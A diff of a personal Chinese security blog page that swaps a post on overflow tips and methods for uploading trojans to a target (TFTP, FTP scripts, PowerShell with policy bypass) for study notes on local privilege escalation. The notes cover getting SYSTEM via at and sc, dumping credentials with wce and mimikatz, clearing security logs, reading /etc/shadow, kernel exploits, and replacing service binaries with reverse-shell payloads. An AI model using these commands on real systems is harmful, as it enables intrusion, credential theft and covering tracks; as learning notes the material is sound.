@@ -206,7 +206,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/24/%E6%BA%A2%E5%87%BA%E6%80%9D%E8%B7%AF/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/26/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Image.JPG">
@@ -220,7 +220,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/04/24/%E6%BA%A2%E5%87%BA%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">溢出思路</a>
+            <a href="/2020/04/26/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/" class="post-title-link" itemprop="url">本地提权</a>
         </h1>
 
         <div class="post-meta">
@@ -230,14 +230,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2020-04-24 12:21:43" itemprop="dateCreated datePublished" datetime="2020-04-24T12:21:43+08:00">2020-04-24</time>
+              <time title="Created: 2020-04-26 11:09:39" itemprop="dateCreated datePublished" datetime="2020-04-26T11:09:39+08:00">2020-04-26</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-26 10:01:43" itemprop="dateModified" datetime="2020-04-26T10:01:43+08:00">2020-04-26</time>
+                <time title="Modified: 2020-05-05 19:52:18" itemprop="dateModified" datetime="2020-05-05T19:52:18+08:00">2020-05-05</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -262,73 +262,71 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="溢出其余思路"><a href="#溢出其余思路" class="headerlink" title="溢出其余思路"></a>溢出其余思路</h2><ol>
-<li>有的时候我们可能只能发送指定个数的溢出字符，比如说只有发送3000个a的时候我们才能控制EIP的指定内容。</li>
-<li>有的时候我们可能并不能修改很多字符，情况是我们在EIP后面的栈内容中只能写很少个数的内容，但是我们溢出肯定有很多代码，所以找到那段字节，这个值可能是存在eax/ebx/edi之类的寄存器存储的内存单元指向的地址的，我们可以修改他，然后使用jmp eax之类的命令跳转过去，当然我们还是要先将EIP跳到ESP，然后间接跳转。</li>
-<li>跳转的时候还可以使用call，但是记得要恢复堆栈平衡的。</li>
-<li>溢出的坏字符一定要先查询</li>
+          <h2 id="kali安装VM-TOOLS"><a href="#kali安装VM-TOOLS" class="headerlink" title="kali安装VM_TOOLS"></a>kali安装VM_TOOLS</h2><p>最新版本需要执行：<code>sudo apt-get install open-vm-tools-desktop fuse</code>才可以。</p>
+<h1 id="操作系统用户"><a href="#操作系统用户" class="headerlink" title="操作系统用户"></a>操作系统用户</h1><ol>
+<li>Windows<ol>
+<li>user：普通的用户</li>
+<li>administrator：超级管理员</li>
+<li>system：内核级管理员</li>
+<li>administrator包含user功能，system包含administrator和user的大部分功能</li>
+<li>Guest是最小的权限</li>
 </ol>
-<h2 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h2><ol>
-<li>Exploit-db</li>
-<li>SecurityFocus</li>
-<li>Searchsploit</li>
+</li>
+<li>Linux<ol>
+<li>user：普通用户</li>
+<li>root：超级管理员</li>
+<li>root级别最大，可以掌控所有</li>
 </ol>
-<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><ol>
-<li><p>Linux：</p>
+</li>
+</ol>
+<h2 id="Windows下的administrator到system"><a href="#Windows下的administrator到system" class="headerlink" title="Windows下的administrator到system"></a>Windows下的administrator到system</h2><p>XP：使用命令：<code>at 11:24 /interactive cmd</code><br>意思就是在11:24分启动一个交互的cmd，权限是system，因为at命令是由system权限的。<br><img src="img1.jpg" alt="adtosys"><br>再次之后在这个cmd启动的都是system权限，然后使用taskmgr打开进程管理器，杀死explore进程，然后再用system启动explore进程，那么系统就会进入system权限了。</p>
+<p>win7/win8：at已经没了，sc命令：<br><code>sc Create syscmd binPath=&quot;cmd /K start&quot; type=own type=interactive</code><br><code>sc start syscmd</code><br>服务都是system进行启动。<br>第一句是创建一个名称为syscmd的服务，这个服务是启动一个可以交互的命令行。<br>第二条是启动这个服务。</p>
+<p>微软提供了些提权的套件。</p>
+<p>注入进程提权：就是注入已经启动了的System进程，然后获取CMD。<br>一般提供一个端口就是我们可以使用nc连接的。<br>优点是因为注入所以不会被管理员通过进程发现异常。</p>
+<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><ol>
+<li>通过数据包的抓取嗅探，可以获得更多账号的账号密码。</li>
+<li>通过键盘记录器。</li>
+<li>本地缓存密码（浏览器的密码记录，远程登陆凭证，无线wifi密码）</li>
+<li>PwDump(kali带着)，支持查看远程的加密密码，现在这些Windows的工具都存放在/usr/share/windows-binaries下面了</li>
+<li>Windows登录的密码是在C盘下的Windows下的system32下的config下的SAM文件，但是是加密的</li>
+<li>wce 在内存中读取登录的账号的sessions信息</li>
+<li><code>wce -lv</code>查看当前登录的sessions信息</li>
+<li><code>wce -d password</code>计算hash密码</li>
+<li><code>wce -w</code>读取一个存储的明文包密码，有可能能独处登录用户的密码，其实也就是Digest这个包中存在明文密码。</li>
+<li>wce可以执行的话呢必须要是管理员</li>
+<li><code>wce -i 0004BE06 -s xxx:xxxxxxxxxxxx:xxxxxxxxxx</code></li>
+<li>上面这句话的意思就是说，把那个0004BE06的账号改为后面的这个账号</li>
+<li>mimikatz使用先提权</li>
+<li><code>privilege::debug</code>提升权限</li>
+<li><code>sekurlsa::logonPasswords</code>可以查看太多的信息。</li>
+<li><code>ts::multirdp</code>允许多用户同时登陆</li>
+<li><code>event::clear</code>清除安全日志</li>
+<li><code>event::drop</code>不产生安全日志</li>
+<li>使用一定的漏洞进行提权，例如<code>MS-11-080，MS14-068</code></li>
+</ol>
+<h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>首先需要一台Linux内核小于2.6.39的一个系统（这里用的是bee的那个Ubuntu），我们现在是普通用户。<br><img src="img2.jpg" alt="normalusr"><br>然后我们在kali中编译这个版本的漏洞，搜索<code>2.6.39</code>，使用<code>18411.c</code>这个文件，Linux内核的一个漏洞<br><img src="img3.jpg" alt="gcc"><br>然后将生成的exp放在目标系统上。<br>但是生成的文件无法运行，需要将源码移植到Ubuntu上面，然后在上面运行gcc编译源码。<br>但是最终我还是没有能够进行提权，我觉得可能是我的版本太低了。</p>
+<h2 id="配置不当提权"><a href="#配置不当提权" class="headerlink" title="配置不当提权"></a>配置不当提权</h2><p>就是通过有些服务是system权限运行的，我们替换掉这个文件然后重启服务，我们修改的程序就有了system的权限。<br>当然我们需要有修改文件的权限（这一点需要管理员配置不当）。</p>
+<h3 id="Windows下查找"><a href="#Windows下查找" class="headerlink" title="Windows下查找"></a>Windows下查找</h3><p>使用icacls进行文件权限的查询。<br>常用命令：<code>icacls c:\windows\*.exe /save perm /T</code><br>这个是进行递归的一个查询Windows下面的程序的权限列举，生成一个perm文件进行保存。<br>最后搜索一个：<code>FA;;;BU</code>找到对应的程序，然后我们替换，就等着管理员重启机器。<br>替换的文件可以进行捆绑反弹shell。</p>
+<h3 id="Linux下查找"><a href="#Linux下查找" class="headerlink" title="Linux下查找"></a>Linux下查找</h3><p><code>find / -perm 777 -exec ls -l {} \;</code></p>
+<h2 id="查找隐私信息"><a href="#查找隐私信息" class="headerlink" title="查找隐私信息"></a>查找隐私信息</h2><p>Linux：</p>
 <ol>
-<li>netcat</li>
-<li>curl</li>
-<li>wget</li>
+<li>/etc/resolv.conf</li>
+<li>/etc/passwd</li>
+<li>/etc/shadow</li>
+<li>whoami,who -a</li>
+<li>ifconfig -a ,iptables -L -n,netstat -rn</li>
+<li>uname -a.ps aux</li>
+<li>dpkg -l | head</li>
 </ol>
-</li>
-<li><p>Windows：<br>nc反弹的shell并不是一个交互的shell，不能进一步使用太多功能。</p>
+<p>Windows：</p>
 <ol>
-<li>TFTP（UDP，不加密，没有身份验证）<ol>
-<li>XP，2003都是有的</li>
-<li>Win7、2008都需要单独添加</li>
-<li>但是一般会被防火墙过滤</li>
-<li>mkdir /tftp</li>
-<li>将要上传到文件复制到tftp中</li>
-<li>chown -R nobody /tftp</li>
-<li>atftpd –daemon –port 69 /tftp</li>
-<li>netstat -panu | grep 69</li>
-<li>上面的命令主要是判断是不是atftpd打开的69，如果不是说明chown需要再运行一次</li>
-<li>在shell中使用<code>tftp -i 192.168.209.130 get 在tftp中的文件</code></li>
-</ol>
-</li>
-<li>FTP进行下载<ol>
-<li><code>echo open 192.168.209.130 &gt; ftp.txt</code></li>
-<li><code>echo username &gt;&gt; ftp.txt</code></li>
-<li><code>echo password &gt;&gt; ftp.txt</code></li>
-<li><code>echo bin &gt;&gt; ftp.txt</code></li>
-<li><code>echo GET file.exe &gt;&gt; ftp.txt</code></li>
-<li><code>echo bye &gt;&gt; ftp.txt</code></li>
-<li>在shell中执行<code>ftp -s:ftp.txt</code></li>
-</ol>
-</li>
-<li>vbs通过http传输<ol>
-<li>使用echo输出</li>
-<li>然后本机开80，放木马</li>
-<li>对面下载（使用cscript）</li>
-</ol>
-</li>
-<li>使用POWERSHELL传输文件<ol>
-<li>编写脚本和vbs差不多</li>
-<li><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonIneractive -NoProfile filename.ps1</code></li>
-</ol>
-</li>
-<li>使用Debug<ol>
-<li>使用压缩壳对木马进行压缩</li>
-<li>使用<code>exe2bat.exe nc.exe nc.txt</code>吧exe转换成文本的二进制文件</li>
-<li>然后在shell中执行echo的语句，记住最后两句不是</li>
-<li>他会在目标生成一个hex文件</li>
-<li>最后再使用他最后两句的第一句，使用Debug汇编会生成一个DLL</li>
-<li>然后使用最后一句改名DLL为执行程序</li>
-<li>这个方法不能大于64KB</li>
-</ol>
-</li>
-</ol>
-</li>
+<li>ipconfig /all ,ipconfig /displaydns,netstat -bnao,netstat -r</li>
+<li>new view,new view /domain</li>
+<li>new user /domain,net user %username% /domain</li>
+<li>net localgroup administrator username /add</li>
+<li>net group “Domain Controllers” /domain</li>
+<li>net share name$=C:/unlimited</li>
+<li>net user username /active:yes /domain</li>
 </ol>
 
       
@@ -349,7 +347,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/22/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><span class="page-number current">23</span><a class="page-number" href="/page/24/">24</a><span class="space">&hellip;</span><a class="page-number" href="/page/131/">131</a><a class="extend next" rel="next" href="/page/24/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/22/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><span class="page-number current">23</span><a class="page-number" href="/page/24/">24</a><span class="space">&hellip;</span><a class="page-number" href="/page/132/">132</a><a class="extend next" rel="next" href="/page/24/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -416,18 +414,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">131</span>
+          <span class="site-state-item-count">132</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
